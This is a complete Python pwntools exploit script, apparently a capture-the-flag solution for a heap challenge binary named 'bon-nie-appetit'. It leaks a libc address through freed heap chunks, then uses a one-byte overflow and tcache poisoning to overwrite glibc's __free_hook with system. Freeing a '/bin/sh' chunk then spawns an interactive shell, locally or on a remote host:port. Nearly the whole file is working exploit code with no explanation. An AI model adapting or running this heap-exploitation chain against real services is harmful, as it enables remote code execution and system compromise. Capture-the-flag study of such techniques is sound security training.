#!/usr/bin/env python3

from pwn import *

context.binary = 'bon-nie-appetit'
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def create(p, amount: int, order: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'[*] For how many: ', str(amount).encode())
    p.sendafter(b'[*] What would you like to order: ', order)


def show(p, index: int) -> bytes:
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'[*] Number of order: ', str(index).encode())
    p.recvuntil(b' => ')
    return p.recvuntil(b'\n+=-=-=-=-=-=-=-=-=-=-=-=-=-=+\n', drop=True)


def edit(p, index: int, order: bytes):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'[*] Number of order: ', str(index).encode())
    p.sendafter(b'[*] New order: ', order)


def delete(p, index: int):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'[*] Number of order: ', str(index).encode())


def main():
    p = get_process()

    for _ in range(9):
        create(p, 0x88, b'asdf')

    for i in range(8, -1, -1):
        delete(p, i)

    for _ in range(8):
        create(p, 0x88, b'a')

    leak = u64(show(p, 7)[:6].ljust(8, b'\0'))
    log.info(f'Leaked main_arena address: {hex(leak)}')
    glibc.address = leak - 0x3ebd61
    log.success(f'Glibc base address: {hex(glibc.address)}')

    create(p, 0x18, b'A' * 0x18)  # 8
    create(p, 0x18, b'B' * 0x18)  # 9
    create(p, 0x18, b'C' * 0x18)  # 10
    delete(p, 10)
    edit(p, 8, b'A' * 0x18 + b'\x41')

    delete(p, 9)
    create(p, 0x38, b'B' * 0x18 + p64(0x21) + p64(glibc.sym.__free_hook))

    create(p, 0x18, b'/bin/sh\0')
    create(p, 0x18, p64(glibc.sym.system))
    delete(p, 10)

    p.interactive()


if __name__ == '__main__':
    main()
